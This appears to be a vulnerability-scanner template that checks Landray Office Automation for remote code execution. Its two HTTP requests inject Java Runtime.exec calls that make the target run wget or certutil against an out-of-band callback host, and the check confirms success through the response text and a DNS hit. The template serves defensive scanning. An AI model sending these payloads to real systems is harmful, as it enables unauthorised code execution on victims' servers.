id: landray_office_automation_rce
info:
  name: Landray Office Automation RCE
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    A remote code execution vulnerability in Landray Office Automation through injection of OS commands in a script parameter.
  reference:
    - https://www.cnsuc.net/thread-553.htm
http:
  - raw:
      - |
        GET /data/sys-common/datajson.js?s_bean=sysFormulaSimulateByJS&script=function%20test(){%20return%20java.lang.Runtime};r=test();r.getRuntime().exec("wget%20-P%20/tmp/%20{{interactsh-url}}")&type=1 HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "模拟通过"
        part: body
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
  - raw:
      - |
        GET /data/sys-common/datajson.js?s_bean=sysFormulaSimulateByJS&script=function%20test(){%20return%20java.lang.Runtime};r=test();r.getRuntime().exec("certutil%20-urlcache%20-split%20-f%20{{interactsh-url}}")&type=1 HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "模拟通过"
        part: body
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
